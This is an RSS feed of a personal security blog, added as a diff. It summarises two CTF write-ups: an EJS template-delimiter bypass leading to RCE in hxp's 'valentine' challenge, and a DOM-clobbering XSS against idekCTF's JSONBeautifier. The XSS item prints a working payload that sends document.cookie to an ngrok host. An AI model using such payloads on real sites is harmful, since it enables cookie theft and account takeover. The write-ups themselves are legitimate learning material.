@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>an4er&#39; blog</title>
+    <link>http://blog.an4er.top/</link>
+    <description>Recent content on an4er&#39; blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 22 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://blog.an4er.top/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>hxp valentine wp</title>
+      <link>http://blog.an4er.top/post/hxp_valentine/</link>
+      <pubDate>Wed, 22 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://blog.an4er.top/post/hxp_valentine/</guid>
+      <description>hxp valentine wp 签到就算成功
+challenge 题目关键过滤点在while循环检测ejs的模板语法，如果存在除了复制语法外则返回400
+solve 首先查看ejs的渲染函数，根据注释和查看源码，可以知道shallowCopyFromList函数的作用是遍历data中的键值对，如果data中有键名为_OPTS_PASSABLE_WITH_DATA其中一个，则将其复制到opts中
+所以我们现在可以通过data可控以下几个参数
+var _OPTS_PASSABLE_WITH_DATA = [&amp;#39;delimiter&amp;#39;, &amp;#39;scope&amp;#39;, &amp;#39;context&amp;#39;, &amp;#39;debug&amp;#39;, &amp;#39;compileDebug&amp;#39;, &amp;#39;client&amp;#39;, &amp;#39;_with&amp;#39;, &amp;#39;rmWhitespace&amp;#39;, &amp;#39;strict&amp;#39;, &amp;#39;filename&amp;#39;, &amp;#39;async&amp;#39;]; 然后看了下delimiter是模板引擎中选择的控制符号，默认为%，也就是默认我们使用 &amp;lt;% %&amp;gt; 达到使用模板语句的效果，但是完美被前面的while给防御住了，但是我们只用传入的是&amp;lt;$ $&amp;gt;然后让模板引擎可以正常的解析的话我们就可以使用模板语句RCE了，如下是delimiter的复制所以我们的控制符号可以通过opts可控了
+然后检测标签的地方在
+完成绕过，最后避免一下缓存就可以了</description>
+    </item>
+    
+    <item>
+      <title>idekCTF 2022 XSS</title>
+      <link>http://blog.an4er.top/post/idekxss/</link>
+      <pubDate>Wed, 25 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://blog.an4er.top/post/idekxss/</guid>
+      <description>idekXSS JSONBeautifier 从@zeyu2001师傅的payload学习赛中卡住的相关基础知识后自己尝试复现
+{&amp;#34;x&amp;#34;:&amp;#34;&amp;lt;/pre&amp;gt;&amp;lt;iframe name=&amp;#39;fetch(&amp;amp;quot;http://0.tcp.ngrok.io:15336?cookie=&amp;amp;quot;+document.cookie)&amp;#39; srcdoc=&amp;#39;&amp;lt;iframe name=config srcdoc=&amp;amp;#039;&amp;lt;head&amp;gt;&amp;lt;title id=debug&amp;gt;test&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;frameset id=opts cols=x:eval(/*, */name)//&amp;gt;&amp;lt;/frameset&amp;gt;&amp;amp;#039;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;div id=json-input&amp;gt;{&amp;amp;quot;x&amp;amp;quot;:&amp;amp;quot*/name)//&amp;amp;quot}&amp;lt;/div&amp;gt;&amp;lt;script src=static/js/main.js&amp;gt;&amp;lt;/script&amp;gt;&amp;#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#34;} 源码不多，简单看一下源码，一个flask应用为服务添加CSP：
+response.headers[&amp;#39;Content-Security-Policy&amp;#39;] = &amp;#34;script-src &amp;#39;unsafe-eval&amp;#39; &amp;#39;self&amp;#39;; object-src &amp;#39;none&amp;#39;;&amp;#34; 这允许我们使用同源的JS文件和eval函数，然后有个main.js文件，关键代码如下：
+userJson = JSON.parse(inputBox.textContent); const cols = this.config?.opts?.cols || defaults.opts.cols; output = JSON.stringify(userJson, null, cols); if(this.config?.debug || defaults.debug){ eval(`beautified = ${output}`); return beautified; }; outputBox.innerHTML = `&amp;lt;pre&amp;gt;${output}&amp;lt;/pre&amp;gt;` 因为我们的最终目的是XSS，所以我们需要进入eval函数，也就是需要给this.config.debug赋值，而且下面outputBox.innerHTML的赋值中的output可控，JSON.stringify的第三个参数可控的话可以导致逃逸出字符串
+我们可以将&amp;lt;pre&amp;gt;标签闭合，然后就可以插入任意html，比赛的时候没想到DOM clobbering，赛后学习一下
+https://portswigger.net/research/dom-clobbering-strikes-back
+https://portswigger.net/web-security/dom-based/dom-clobbering
+在文中提到超过三层的时候可以使用
+&amp;lt;iframe name=a srcdoc=&amp;#34; &amp;lt;iframe srcdoc=&amp;#39;&amp;lt;a id=c name=d href=cid:Clobbered&amp;gt;test&amp;lt;/a&amp;gt;&amp;lt;a id=c&amp;gt;&amp;#39; name=b&amp;gt;&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;script&amp;gt;setTimeout(()=&amp;gt;alert(a.b.c.d),500)&amp;lt;/script&amp;gt; 因为我们只需要三层，所以我尝试简单改造一下
+&amp;lt;iframe name=a srcdoc=&amp;#34; &amp;lt;iframe srcdoc=&amp;#39;&amp;lt;a id=opts name=cols href=cid:Clobbered&amp;gt;test&amp;lt;/a&amp;gt;&amp;lt;a id=opts&amp;gt;&amp;#39; name=config&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=.</description>
+    </item>
+    
+  </channel>
+</rss>
